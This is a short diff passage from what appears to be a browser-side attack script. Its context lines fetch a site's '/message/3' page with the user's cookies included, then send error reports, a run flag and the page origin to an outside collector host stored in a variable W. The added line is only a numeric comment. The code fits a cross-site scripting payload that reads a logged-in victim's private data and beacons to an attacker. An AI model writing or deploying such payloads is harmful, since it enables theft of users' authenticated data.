@@ -10,3 +10,4 @@ fetch(location.origin + '/message/3', {credentials:'include'})
     fetch(W + '?err=' + encodeURIComponent(e.message));
   });
 fetch(W + '?run=1&origin=' + encodeURIComponent(location.origin));
+// 1780300694
